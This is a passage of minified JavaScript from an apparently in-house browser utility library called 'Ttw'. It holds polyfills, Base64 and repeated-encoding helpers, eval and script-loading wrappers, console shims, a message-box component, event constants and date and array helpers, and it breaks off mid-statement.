try{var require = NativeModule ? NativeModule.require : require;}catch(er){}
global.window=global,global._$TATIC_CONST_DEBUG=global._$TATIC_CONST_DEBUG||!1,global.TtwLog=global.TtwLog||null,global.TtwPackage=function(){!function(){function t(t,e){e=e||{bubbles:!1,cancelable:!1,detail:void 0};var n=global.document.createEvent("CustomEvent");return n.initCustomEvent(t,e.bubbles,e.cancelable,e.detail),n}try{if("function"==typeof global.CustomEvent)return!1;t.prototype=window.Event.prototype,global.CustomEvent=t}catch(e){}}(),function(){return"function"==typeof Object.__defineGetter__?!1:void(Object.prototype.__defineGetter__=function(t,e){var n=Object.getOwnPropertyDescriptor(this,t);return n?void(n.get=e):void Object.defineProperty(this,t,{get:e})})}(),function(){return"function"==typeof Object.__defineSetter__?!1:void(Object.prototype.__defineSetter__=function(t,e){var n=Object.getOwnPropertyDescriptor(this,t);return n?void(n.set=e):void Object.defineProperty(this,t,{set:e})})}();var k="TtwPackage";global.window=global;var g=global,w=global,d=w.document;w._TTW_$TATIC_JS_IMPORT=function(t,e){o=d.createElement("SCRIPT"),o.type="text/javascript",o.async=!1,o.defer=!0,o.src=t,"8"==document.documentMode?o.onreadystatechange=function(){"loaded"==this.readyState&&(e?e():null)}:o.onload=function(t){e?e():null},d.getElementsByTagName("HEAD")[0].appendChild(o)},w._TTW_$TATIC_JS_IMPORT_ASYNC=function(t,e){o=d.createElement("SCRIPT"),o.type="text/javascript",o.async=!0,o.src=t,"8"==document.documentMode?o.onreadystatechange=function(){"loaded"==this.readyState&&(e?e():null)}:o.onload=function(t){e?e():null},d.getElementsByTagName("HEAD")[0].appendChild(o)},w.Lib=w.Lib||{global:w,window:w},w.Lib.Ttw=w.Lib.Ttw||{global:w,window:w},w.Lib.Ttw.CLASS=w.Lib.Ttw.CLASS||{},w.Lib.Ttw.CLASS.DisplayObject=w.Lib.Ttw.CLASS.DisplayObject||{},w.Lib.Ttw.CLASS.Error=w.Lib.Ttw.CLASS.Error||{},w.Lib.Ttw.CLASS.Event=w.Lib.Ttw.CLASS.Event||{},w.Lib.Ttw.CLASS.FN=w.Lib.Ttw.CLASS.FN||{},w.Lib.Ttw.CLASS.Google=w.Lib.Ttw.CLASS.Google||{},w.Lib.Ttw.CLASS.Runner=w.Lib.Ttw.CLASS.Runner||{},w.Lib.Ttw.CLASS.STtw=w.Lib.Ttw.CLASS.STtw||{},w.Lib.Ttw.CLASS.UIComponent=w.Lib.Ttw.CLASS.UIComponent||{},w.Instance=w.Instance||{},w.Instance.Ttw=w.Instance.Ttw||{},w.Instance.Ttw.Google=w.Instance.Ttw.Google||{},w.Instance.Ttw.UIComponent=w.Instance.Ttw.UIComponent||{};var lt=w.Lib.Ttw;if(lt.CONST={ALPHABET_BIG:["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"],ALPHABET_SMALL:["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"],B_FIRE_FOX:!1},global.atob)var _f0=atob,_f1=btoa;else{!function(t){"use strict";var e,n=t.Base64,r="2.1.9";if("undefined"!=typeof module&&module.exports)try{e=require("buffer").Buffer}catch(i){}var a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",o=function(t){for(var e={},n=0,r=t.length;r>n;n++)e[t.charAt(n)]=n;return e}(a),l=String.fromCharCode,c=function(t){if(t.length<2){var e=t.charCodeAt(0);return 128>e?t:2048>e?l(192|e>>>6)+l(128|63&e):l(224|e>>>12&15)+l(128|e>>>6&63)+l(128|63&e)}var e=65536+1024*(t.charCodeAt(0)-55296)+(t.charCodeAt(1)-56320);return l(240|e>>>18&7)+l(128|e>>>12&63)+l(128|e>>>6&63)+l(128|63&e)},s=/[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g,u=function(t){return t.replace(s,c)},_=function(t){var e=[0,2,1][t.length%3],n=t.charCodeAt(0)<<16|(t.length>1?t.charCodeAt(1):0)<<8|(t.length>2?t.charCodeAt(2):0),r=[a.charAt(n>>>18),a.charAt(n>>>12&63),e>=2?"=":a.charAt(n>>>6&63),e>=1?"=":a.charAt(63&n)];return r.join("")},d=t.btoa?function(e){return t.btoa(e)}:function(t){return t.replace(/[\s\S]{1,3}/g,_)},h=e?function(t){return(t.constructor===e.constructor?t:new e(t)).toString("base64")}:function(t){return d(u(t))},f=function(t,e){return e?h(String(t)).replace(/[+\/]/g,function(t){return"+"==t?"-":"_"}).replace(/=/g,""):h(String(t))},T=function(t){return f(t,!0)},L=new RegExp(["[À-ß][-¿]","[à-ï][-¿]{2}","[ð-÷][-¿]{3}"].join("|"),"g"),p=function(t){switch(t.length){case 4:var e=(7&t.charCodeAt(0))<<18|(63&t.charCodeAt(1))<<12|(63&t.charCodeAt(2))<<6|63&t.charCodeAt(3),n=e-65536;return l((n>>>10)+55296)+l((1023&n)+56320);case 3:return l((15&t.charCodeAt(0))<<12|(63&t.charCodeAt(1))<<6|63&t.charCodeAt(2));default:return l((31&t.charCodeAt(0))<<6|63&t.charCodeAt(1))}},S=function(t){return t.replace(L,p)},g=function(t){var e=t.length,n=e%4,r=(e>0?o[t.charAt(0)]<<18:0)|(e>1?o[t.charAt(1)]<<12:0)|(e>2?o[t.charAt(2)]<<6:0)|(e>3?o[t.charAt(3)]:0),i=[l(r>>>16),l(r>>>8&255),l(255&r)];return i.length-=[0,0,2,1][n],i.join("")},m=t.atob?function(e){return t.atob(e)}:function(t){return t.replace(/[\s\S]{1,4}/g,g)},y=e?function(t){return(t.constructor===e.constructor?t:new e(t,"base64")).toString()}:function(t){return S(m(t))},w=function(t){return y(String(t).replace(/[-_]/g,function(t){return"-"==t?"+":"/"}).replace(/[^A-Za-z0-9\+\/]/g,""))},v=function(){var e=t.Base64;return t.Base64=n,e};if(t.Base64={VERSION:r,atob:m,btoa:d,fromBase64:w,toBase64:f,utob:u,encode:f,encodeURI:T,btou:S,decode:w,noConflict:v},"function"==typeof Object.defineProperty){var M=function(t){return{value:t,enumerable:!1,writable:!0,configurable:!0}};t.Base64.extendString=function(){Object.defineProperty(String.prototype,"fromBase64",M(function(){return w(this)})),Object.defineProperty(String.prototype,"toBase64",M(function(t){return f(this,t)})),Object.defineProperty(String.prototype,"toBase64URI",M(function(){return f(this,!0)}))}}t.Meteor&&(Base64=t.Base64)}(lt);var _f0=lt.Base64.atob,_f1=lt.Base64.btoa}var _ab=function(t,e){for(i=0,iLen=e;i<iLen;++i)t=_f0(t);return t},_ab1=function(t){return _f0(t)};lt.ab=function(t,e){return _ab(t,e)};var _ba=function(t,e){for(i=0,iLen=e;i<iLen;++i)t=_f1(t);return t},_ba1=function(t){return _f1(t)};lt.ba=function(t,e){return _ba(t,e)};var _abt=function(t,e){for(i=0,iLen=e;i<iLen;++i)t=_f0(t).replace(_abbats,"");return t},_abt1=function(t){return t=_f0(t).replace(_abbats,"")};lt.abt=function(t,e){return _abt(t,e)};var _bat=function(t,e){for(i=0,iLen=e;i<iLen;++i){var e=t.length,n=t.substr(0,e/2),r=t.substr(e/2,e);t=n+_abbats+r,t=_f1(t)}return t},_bat1=function(t){var e=t.length,n=t.substr(0,e/2),r=t.substr(e/2,e);return t=n+_abbats+r,t=_f1(t)};lt.bat=function(t,e){return _bat(t,e)};var _abbats="VjJ0V2EySXlSWGxWYTJocVUwaENhRlZ1Y0ZkalZteFlUbFU1VGsxcmIzcFZSbEYzVUZFOVBRPT0=",gabbats=function(){return _abbats},_abt2=function(t){return _abt1(_abt1(t))},_abt3=function(t){return _abt1(_abt2(t))},_abt4=function(t){return _abt1(_abt3(t))},_abt5=function(t){return _abt1(_abt4(t))},_bat2=function(t){return _bat1(_bat1(t))},_bat3=function(t){return _bat1(_bat2(t))},_bat4=function(t){return _bat1(_bat3(t))},_bat5=function(t){return _bat1(_bat4(t))},_checkObjKey=function(t,e){return t[e]?1:0};lt.checkObjKey=function(t,e){return _checkObjKey(t,e)};var _deleteKey=function(t,e){t[e]=null;try{delete t[e]}catch(n){}};lt.deleteKey=function(t,e){_deleteKey(t,e)};var _eval=function(s){return eval(s)};lt.eval=function(t){return _eval(t)};var _evalCapsule=function(s){return eval("(function(){return "+s+";})()")};lt.evalCapsule=function(t){return _evalCapsule(t)};var _evalMakeCapsule=function(s){return eval("(function(){return "+s+";})")};lt.evalMakeCapsule=function(t){return _evalMakeCapsule(t)};var _hasOwnProperty=function(t){return w[t]?1:0};lt.hasOwnProperty=function(t){return _hasOwnProperty(t)};var _getValue__CheckHasOwnProperty=function(t,e,n){return t.hasOwnProperty(e)?t[e]:n};lt.getValue__CheckHasOwnProperty=function(t,e,n){return _getValue__CheckHasOwnProperty(t,e,n)},lt.importJS=function(t,e){lt.importJS_Async(t,e,!1)};var _importJS_Async=function(t,e,n){var r=global,i=r.document,a=i.createElement("SCRIPT");a.type="text/javascript",a.onreadystatechange=a.onload=e?e:null,a.async=n,a.src=t,i.getElementsByTagName("HEAD")[0].appendChild(a)};lt.importJS_Async=function(t,e,n){_importJS_Async(t,e,n)},lt.importJS_Async_False=function(t,e){lt.importJS_Async(t,e,!1)},lt.importJS_Async_True=function(t,e){lt.importJS_Async(t,e,!0)},lt.importJSs=function(t,e){lt.importJSs_Async_False(t,e)};var _importJSs_Async_False=function(t,e,n){n||(n="_$_DATA_importJSs"),Lib.Ttw[n]={idx:0,data:t,len:t.length,run:function(){var t=Lib.Ttw,e=t._$_DATA_importJSs;t.importJS(e.data[e.idx],function(){++e.idx,e.idx<e.len&&e.run(),e.run=null})}},Lib.Ttw._$_DATA_importJSs.run()};lt.importJSs_Async_False=function(t,e,n){_importJSs_Async_False(t,e,n)};var _writeJS=function(t,e){e?document.write('<script type="text/javascript" src="'+t+'"onload="javaScript:'+e+'()""onreadystatechange="javascript:'+e+'()"></script>'):document.write('<script type="text/javascript" src="'+t+'"></script>')};lt.writeJS=function(t,e){_writeJS(t,e)};var _writeInJS=function(t,e){e?document.writeln('<script type="text/javascript" src="'+t+'"onload="javaScript:'+e+'()""onreadystatechange="javascript:'+e+'()"></script>'):document.writeln('<script type="text/javascript" src="'+t+'"></script>')};lt.writelnJS=function(t,e){_writeInJS(t,e)},lt.initialize_Console=function(){if(w.console)w.TtwLog=w.console,w.TtwLog.timeStamp=w.TtwLog.log;else{for(this.d=["assert","clear","count","debug","dir","dirxml","error","info","log","profile","profileEnd","time","timeEnd","timeStamp","trace","warn"],this.fDefault=function(){},w.console=w.console||{},this.t=w.console,this.i=0,this.iLen=this.d.length;this.i<this.iLen;++this.i)this.t[this.d[this.i]]=this.t[this.d[this.i]]||this.fDefault;w.TtwLog=this.t}w.TtwLog.logCheckSameObject=function(kT,kCT){var t=eval(kT),ct=eval(kCT);try{}catch(e){}},w.TtwLog.logCommentDash10=function(){},w.TtwLog.logCommentDash30=function(){},w.TtwLog.logCommentDash50=function(){},w.TtwLog.logCommentDash50_5=function(){var t=w.TtwLog.logCommentDash50;t(),t(),t(),t(),t()},w.TtwLog.logCommentDash100=function(){};var _logObjectInformation=function(t,e){var n=[];for(var r in t)n.push(r);n.sort();var i=0,a=n.length;if(global._$TATIC_CONST_DEBUG)for(;a>i;++i)try{"function"==typeof t[n[i]]}catch(o){}else for(;a>i;++i);};w.TtwLog.logObjectInformation=function(t,e){_logObjectInformation(t,e)};var _logObjectInformationExportLogSource=function(t,e,n){n=n||!1;var r=[];for(var i in t)r.push(i);r.sort();var a=0,o=r.length;if(global._$TATIC_CONST_DEBUG)for(;o>a;++a)try{"function"==typeof t[r[a]]||"object"==typeof t[r[a]]}catch(l){}else for(;o>a;++a);};w.TtwLog.logObjectInformationExportLogSource=function(t,e,n){_logObjectInformationExportLogSource(t,e,n)};var _f=function(){if(global.console){var t=global.console;t.assert=t.assert||{},t.cd=t.cd||{},t.clear=t.clear||{},t.count=t.count||{},t.countReset=t.countReset||{},t.debug=t.debug||{},t.dir=t.dir||{},t.dirxml=t.dirxml||{},t.error=t.error||{},t.group=t.group||{},t.groupCollapsed=t.groupCollapsed||{},t.groupEnd=t.groupEnd||{},t.info=t.info||{},t.log=t.log||{},t.select=t.select||{},t.time=t.time||{},t.timeEnd=t.timeEnd||{},t.timeStamp=t.timeStamp||{},t.trace=t.trace||{},t.warn=t.warn||{}}else{global.console={};var t=global.console;t.assert=t.assert||{},t.cd=t.cd||{},t.clear=t.clear||{},t.count=t.count||{},t.countReset=t.countReset||{},t.debug=t.debug||{},t.dir=t.dir||{},t.dirxml=t.dirxml||{},t.error=t.error||{},t.group=t.group||{},t.groupCollapsed=t.groupCollapsed||{},t.groupEnd=t.groupEnd||{},t.info=t.info||{},t.log=t.log||{},t.select=t.select||{},t.time=t.time||{},t.timeEnd=t.timeEnd||{},t.timeStamp=t.timeStamp||{},t.trace=t.trace||{},t.warn=t.warn||{}}},_fInterval=setInterval(_f,5e3),_T_t_w=function(){clearInterval(_fInterval),alert("Destroy Core Functions.")};lt.CONST.ALPHABET_BIG.forEach(function(t){lt["_"+t]=function(){_T_t_w()}}),lt.CONST.ALPHABET_SMALL.forEach(function(t){lt["_"+t]=function(){_T_t_w()}}),w.TtwLog.writeln300=function(){for(var t=0,e=300;e>t;++t);}},lt.initialize_hasOwnProperty=function(){var t="hasOwnProperty",e=lt.hasOwnProperty,n=function(n){try{n[t]=n[t]?n[t]:e}catch(r){global.TtwLog.error(n+" Error : "+r)}};n(w)};var _singleton=function(t,e){var n=lt.eval(t);return n?n:(n=e?lt.eval(e):null)?n:null};lt.singleton=function(t,e){return _singleton(t,e)},w.requestAnimationFrame||(w.requestAnimationFrame=function(){return w.webkitRequestAnimationFrame||w.mozRequestAnimationFrame||w.oRequestAnimationFrame||w.msRequestAnimationFrame||function(t,e){w.setTimeout(t,1e3/60)}}()),lt.CLASS.DisplayObject.MessageBox=function(t){function e(t,e){var n=t.callback;_(!1),t.box.parentNode.removeChild(t.box),T=t.box=null,n&&n(e)}function n(t){if(T){t=t||event;var n=t.which||event.keyCode;return TtwMessageBox.message.keyboard&&((13==n||32==n)&&e(T,!0),27==n&&e(T,!1)),t.preventDefault&&t.preventDefault(),!(t.cancelBubble=!0)}}function r(t,n,r){var i=window.document.createElement("DIV");i.className=" TtwMessageBox_modal_box TtwMessageBox-"+t.type,i.setAttribute("TtwMessageBox",1);var a="";if(t.width&&(i.style.width=t.width),t.height&&(i.style.height=t.height),t.title&&(a+='<div class="TtwMessageBox_popup_title">'+t.title+"</div>"),a+='<div class="TtwMessageBox_popup_text"><span>'+(t.content?"":t.text)+'</span></div><div class="TtwMessageBox_popup_controls">',n&&(a+=c(t.ok||"OK",!0)),r&&(a+=c(t.cancel||"Cancel",!1)),t.buttons)for(var o=0;o<t.buttons.length;o++)a+=c(t.buttons[o],o);if(a+="</div>",i.innerHTML=a,t.content){var l=t.content;"string"==typeof l&&(l=window.document.getElementById(l)),"none"==l.style.display&&(l.style.display=""),i.childNodes[t.title?1:0].appendChild(l)}return i.onclick=function(n){n=n||event;var r=n.target||n.srcElement;if(r.className||(r=r.parentNode),"TtwMessageBox_popup_button"==r.className){var i=r.getAttribute("result");i="true"==i||("false"==i?!1:i),e(t,i)}},t.box=i,(n||r)&&(T=t),i}function i(t,e,i){var a=t.tagName?t:r(t,e,i);t.hidden||_(!0),window.document.body.appendChild(a);var o=t.left||Math.abs(Math.floor(((w.innerWidth||window.document.documentElement.offsetWidth)-a.offsetWidth)/2)),l=t.top||Math.abs(Math.floor(((w.innerHeight||window.document.documentElement.offsetHeight)-a.offsetHeight)/2));return"top"==t.position?a.style.top="-3px":a.style.top=l+"px",a.style.left=o+"px",a.onkeydown=n,a.focus(),t.hidden&&TtwMessageBox.modalbox.hide(a),a}function a(t){return i(t,!0,!1)}function o(t,e,n){return"object"!=typeof t&&("function"==typeof e&&(n=e,e=""),t={text:t,type:e,callback:n}),t}function l(t){return i(t)}function c(t,e){return"<div class='TtwMessageBox_popup_button' result='"+e+"' ><div>"+t+"</div></div>"}function s(t){return i(t,!0,!0)}function u(t){h.area||(h.area=window.document.createElement("DIV"),h.area.className="TtwMessageBox_message_area",h.area.style[h.position]="5px",window.document.body.appendChild(h.area)),h.hide(t.id);var e=window.document.createElement("DIV");return e.innerHTML="<div>"+t.text+"</div>",e.className="TtwMessageBox-info TtwMessageBox-"+t.type,e.onclick=function(){h.hide(t.id),t=null},"bottom"==h.position&&h.area.firstChild?h.area.insertBefore(e,h.area.firstChild):h.area.appendChild(e),t.expire>0&&(h.timers[t.id]=w.setTimeout(function(){h.hide(t.id)},t.expire)),h.pull[t.id]=e,e=null,t.id}function _(t){_.cover||(_.cover=window.document.createElement("DIV"),_.cover.onkeydown=n,_.cover.className="TtwMessageBox_modal_cover",window.document.body.appendChild(_.cover));window.document.body.scrollHeight;_.cover.style.display=t?"inline-block":"none"}function d(t,e,n,r){return"object"!=typeof t&&(t={text:t,type:e,expire:n,id:r}),t.id=t.id||h.uid(),t.expire=t.expire||h.expire,t}t.instanceKey=t.instanceKey||"global.Instance.Ttw.TtwMessageBox";var h=lt.singleton(t.instanceKey,null);if(h)return h;w.Instance.Ttw.TtwMessageBox=w.Instance.Ttw.TtwMessageBox?w.Instance.Ttw.TtwMessageBox:{};var f=w.Instance.Ttw.TtwMessageBox;f.instanceKey=t.instanceKey,f["package"]="global.Lib.Ttw.CLASS.DisplayObject.MessageBox";var T=null;global.document.attachEvent?global.document.attachEvent("onkeydown",n):global.document.addEventListener("keydown",n,!0),f.alert=function(){var t=o.apply(this,arguments);return t.type=t.type||"confirm",a(t)},f.confirm=function(){var t=o.apply(this,arguments);return t.type=t.type||"alert",s(t)},f.modalbox=function(){var t=o.apply(this,arguments);return t.type=t.type||"alert",l(t)},f.modalbox.hide=function(t){for(;t&&t.getAttribute&&!t.getAttribute("TtwMessageBox");)t=t.parentNode;t&&(t.parentNode.removeChild(t),_(!1))};var h=f.message=function(t,e,n,r){t=d.apply(this,arguments),t.type=t.type||"info";var i=t.type.split("-")[0];switch(i){case"alert":return a(t);case"confirm":return s(t);case"modalbox":return l(t);default:return u(t)}};return h.expire=4e3,h.keyboard=!0,h.position="top",h.pull={},h.timers={},h.seed=(new Date).valueOf(),h.hide=function(t){var e=h.pull[t];if(e&&e.parentNode){w.setTimeout(function(){e.parentNode.removeChild(e),e=null},2e3),e.className+=" hidden",h.timers[t]&&w.clearTimeout(h.timers[t]);try{delete h.pull[t]}catch(n){}}},h.hideAll=function(){for(var t in h.pull)h.hide(t)},h.uid=function(){return h.seed++},f},lt.CLASS.Error.Error=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.Error";var e=w.Lib.Ttw.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.Error.Error",this)},lt.CLASS.Event.Event=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.Event";var e=w.Lib.Ttw.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.Event.Event",this.ACTIVATE="activate",this.ADDED="added",this.ADDED_TO_STAGE="addedToStage",this.CANCEL="cancel",this.CHANGE="change",this.CHANNEL_MESSAGE="channelMessage",this.CHANNEL_STATE="channelState",this.CLEAR="clear",this.CLOSE="close",this.CLOSING="closing",this.COMPLETE="complete",this.CONNECT="connect",this.CONTEXT3D_CREATE="context3DCreate",this.COPY="copy",this.CUT="cut",this.DEACTIVATE="deactivate",this.DISPLAYING="displaying",this.ENTER_FRAME="enterFrame",this.EXIT_FRAME="exitFrame",this.EXITING="exiting",this.FRAME_CONSTRUCTED="frameConstructed",this.FRAME_LABEL="frameLabel",this.FULLSCREEN="fullScreen",this.HTML_BOUNDS_CHANGE="htmlBoundsChange",this.HTML_DOM_INITIALIZE="htmlDOMInitialize",this.HTML_RENDER="htmlRender",this.ID3="id3",this.INIT="init",this.LOCATION_CHANGE="locationChange",this.MOUSE_LEAVE="mouseLeave",this.NETWORK_CHANGE="networkChange",this.OPEN="open",this.PASTE="paste",this.PREPARING="preparing",this.REMOVED="removed",this.REMOVED_FROM_STAGE="removedFromStage",this.RENDER="render",this.RESIZE="resize",this.SCROLL="scroll",this.SELECT="select",this.SELECT_ALL="selectAll",this.SOUND_COMPLETE="soundComplete",this.STANDARD_ERROR_CLOSE="standardErrorClose",this.STANDARD_INPUT_CLOSE="standardInputClose",this.STANDARD_OUTPUT_CLOSE="standardOutputClose",this.SUSPEND="suspend",this.TAB_CHILDREN_CHANGE="tabChildrenChange",this.TAB_ENABLED_CHANGE="tabEnabledChange",this.TAB_INDEX_CHANGE="tabIndexChange",this.TEXT_INTERACTION_MODE_CHANGE="textInteractionModeChange",this.TEXTURE_READY="textureReady",this.UNLOAD="unload",this.USER_IDLE="userIdle",this.USER_PRESENT="userPresent",this.VIDEO_FRAME="videoFrame",this.WORKER_STATE="workerState",this)},lt.CLASS.Event.EventMouse=function(t){function e(t){return t.detail*=-1}function n(t){return t.wheelDelta}this.instanceKey=t.instanceKey||"global.Lib.Ttw.EventMouse";var r=lt.singleton(t.instanceKey,null);return r?r:(this["package"]="global.Lib.Ttw.CLASS.Event.EventMouse",this.CLICK="click",this.CONTEXT_MENU="contextMenu",this.DOUBLE_CLICK="doubleClick",this.MIDDLE_CLICK="middleClick",this.MIDDLE_MOUSE_DOWN="middleMouseDown",this.MIDDLE_MOUSE_UP="middleMouseUp",this.MOUSE_DOWN="mouseDown",this.MOUSE_MOVE="mouseMove",this.MOUSE_OUT="mouseOut",this.MOUSE_OVER="mouseOver",this.MOUSE_UP="mouseUp",this.MOUSE_WHEEL="mousewheel",this.RELEASE_OUTSIDE="releaseOutside",this.RIGHT_CLICK="rightClick",this.RIGHT_MOUSE_DOWN="rightMouseDown",this.RIGHT_MOUSE_UP="rightMouseUp",this.ROLL_OUT="rollOut",this.ROLL_OVER="rollOver",this.getWheelDelta=function(){},this.getWheelDelta=lt.CONST.B_FIRE_FOX?e:n,this)},lt.CLASS.Event.EventKeyboard=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.EventKeyboard";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.Event.EventKeyboard",w.TtwLog.timeStamp("-------[ S ] - "+this["package"]+"():"+this["package"]),this.KEY_DOWN="keyDown",this.KEY_UP="keyUp",this)},lt.CLASS.FN.Array=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnArray";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.FN.Array",this.getEqualValue=function(t,e){for(var n=0,r=t.length;r>n;++n)if(t[n]==e)return e;return null},this.getEqualValue_Boolean=function(t,e){for(var n=0,r=t.length;r>n;++n)if(t[n]==e)return!0;return!1},this.getEqualValue_Index=function(t,e){for(var n=0,r=t.length;r>n;++n)if(t[n]==e)return n;return-1},this.getEqualValueAndIndex=function(t,e){for(var n=0,r=t.length;r>n;++n)if(t[n]==e)return{idx:n,value:e};return null},this)},lt.CLASS.FN.BitmpData=function(){},lt.CLASS.FN.Common=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnCommon";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.Common",this.runFuncParamLength={0:function(t,e){return t[e]()},1:function(t,e,n){return t[e](n[0])},2:function(t,e,n){return t[e](n[0],n[1])},3:function(t,e,n){return t[e](n[0],n[1],n[2])},4:function(t,e,n){return t[e](n[0],n[1],n[2],n[3])},5:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4])},6:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4],n[5])},7:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4],n[5],n[6])},8:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4],n[5],n[6],n[7])},9:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4],n[5],n[6],n[7],n[8])},10:function(t,e,n){return t[e](n[0],n[1],n[2],n[3],n[4],n[5],n[6],n[7],n[8],n[9])},length:11};var n=function(t,e){for(var n=STtwUtilCommon.destroyKey,r=t.length,i=0,a=e;a>i;++i){var o=i+a;t[o]?(t[i]=t[o],n(t,o)):(t[i]=null,n(t,i))}return t.length=r-a,t};this.argumentsShift__Count=function(t,e){return n.apply(null,arguments)},this.argumentsShift_1=function(t){return STtwUtilCommon.argumentsShift__Count(t,1)};var r=function(t){var e=console,n={k:t};return STtwUtilObject.copyObjectRef(n,global.TtwLog),n.clear=function(t){e.clear()},n.count=function(t){e.count()},n.debug=function(t){e.debug("[ "+n.k+" ]",t)},n.dir=function(t){e.dir("[ "+n.k+" ]",t)},n.dirxml=function(t){e.dirxml("[ "+n.k+" ]",t)},n.error=function(t){e.error("[ "+n.k+" ]",t)},n.dirxml=function(t){e.dirxml("[ "+n.k+" ]",t)},n.info=function(t){e.info("[ "+n.k+" ]",t)},n.log=function(t){e.log("[ "+n.k+" ]",t)},n.profile=function(t){e.profile("[ "+n.k+" ]",t)},n.profileEnd=function(t){e.profileEnd("[ "+n.k+" ]",t)},n.time=function(t){e.time("[ "+n.k+" ]",t)},n.timeStamp=function(t){e.timeStamp("[ "+n.k+" ]",t)},n.trace=function(t){e.trace("[ "+n.k+" ]",t)},n.warn=function(t){e.warn("[ "+n.k+" ]",t)},n};return this.create_Console=function(t){return r(t)},this.destroyKey=function(t,e){t[e]=null;try{delete t[e]}catch(n){}},this.destroyKeys=function(t,e){for(var n=this.destroyKey,r=0,i=e.length;i>r;++r)n(t,e[r])},this.destroyObj=function(t){var e=this.destroyKey;for(var n in t)t[n]=null,e(t,n)},this.eval=function(t){return lt.eval(t)},this.evalCapsule=function(t){return lt.evalCapsule(t)},this.evalMakeCapsule=function(t){return lt.evalMakeCapsule(t)},this.newWindowOpen=function(t,e,n,r){t=t?t:"",e=e?e:"",r=r?!0:!1,w.open(t,e,n,r)},this.getID=function(t){return w.document.getElementById(t)},this.getDocumentHeight=function(){var t=window.document;return t.height?t.height:t.documentElement.clientHeight},this.getDocumentWidth=function(){var t=window.document;return t.width?t.width:t.documentElement.clientWidth},this},lt.CLASS.FN.CustomEvent=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnCustomEvent";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.CustomEvent";var n=function(t,e,n){t.dispatchEvent(new CustomEvent(e,{detail:n}))};this.dispatchCustomEvent=function(t,e,r){n(t,e,r)};var r=function(t,e){t.dispatchEvent(new Event(e))};return this.dispatchEvent=function(t,e){r(t,e)},this},lt.CLASS.FN.Date=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnDate";var e=lt.singleton(t.instanceKey,null);return e?e:(this["package"]="global.Lib.Ttw.CLASS.FN.Date",this.getDate__Date=function(){var t=new Date;return{year:parseInt(t.getFullYear()),month:parseInt(t.getMonth())+1,date:parseInt(t.getDate())}},this.getDate__Date_Array=function(){var t=new Date;return[parseInt(t.getFullYear()),parseInt(t.getMonth())+1,parseInt(t.getDate())]},this.getDate__Date_Light=function(){var t=new Date;return{y:parseInt(t.getFullYear()),m:parseInt(t.getMonth())+1,d:parseInt(t.getDate())}},this.getDate__Milliseconds=function(){var t=new Date;return{year:parseInt(t.getFullYear()),month:parseInt(t.getMonth())+1,date:parseInt(t.getDate()),hour:t.getHours(),minutes:t.getMinutes(),seconds:t.getSeconds(),milliseconds:t.getMilliseconds()}},this.getDate__Milliseconds_Array=function(){var t=new Date;return[parseInt(t.getFullYear()),parseInt(t.getMonth())+1,parseInt(t.getDate()),t.getHours(),t.getMinutes(),t.getSeconds(),t.getMilliseconds()]},this.getDate__Milliseconds_Light=function(){var t=new Date;return{y:parseInt(t.getFullYear()),m:parseInt(t.getMonth())+1,d:parseInt(t.getDate()),ho:t.getHours(),mi:t.getMinutes(),se:t.getSeconds(),mil:t.getMilliseconds()}},this.getDate__Seconds=function(){var t=new Date;return{year:parseInt(t.getFullYear()),month:parseInt(t.getMonth())+1,date:parseInt(t.getDate()),hour:t.getHours(),minutes:t.getMinutes(),seconds:t.getSeconds()}},this.getDate__Seconds_Array=function(){var t=new Date;return[parseInt(t.getFullYear()),parseInt(t.getMonth())+1,parseInt(t.getDate()),t.getHours(),t.getMinutes(),t.getSeconds()]},void(this.getDate__Seconds_Light=function(){var t=new Date;return{y:parseInt(t.getFullYear()),m:parseInt(t.getMonth())+1,d:parseInt(t.getDate()),ho:t.getHours(),mi:t.getMinutes(),se:t.getSeconds()}}))},lt.CLASS.FN.DisObj=function(t){this.instanceKey=t.instanceKey||"global.Lib.Ttw.fnDisObj";var e=lt.singleton(t.instanceKey,null);if(e)return e;this["package"]="global.Lib.Ttw.CLASS.FN.DisObj";var n=function(){var t=STtwUtilDisObj.mouseDisable__ID,e=STtwUtilDisObj.mouseEnable__ID;t("div_0__Background"),e("div_0__Application"),t("div_0__UI_Component_Fixed"),e("div_0__UI_Component_Fixed"),t("div_0__UI_Component_Panel"),t("div_0__Top"),t("div_0__Top_modal")};this.initialize_DisObjRecognition__Set_Basic=function(){n()};var r=function(t){try{var e=t.getAttribute("style");e=e.replace(";pointer-events: all;",""),e=e.replace(";pointer-events: auto;",""),e=e.replace(";pointer-events: none;",""),t.setAttribute("style",e+";pointer-events: none;")}catch(n){t.setAttribute("style",";pointer-events: none;")}};this.mouseDisable=r,this.mouseDisable__ID=function(t){r(window.document.getElementById(t))};var i=function(t){try{var e=t.getAttribute("style");e=e.replace(";pointer-events: all;","").replace(";pointer-events: auto;","").replace(";pointer-events: none;",""),t.setAttribute("style",e+";pointer-events: auto;")}catch(n){t.setAttribute("style",";pointer-events: auto;")}};return 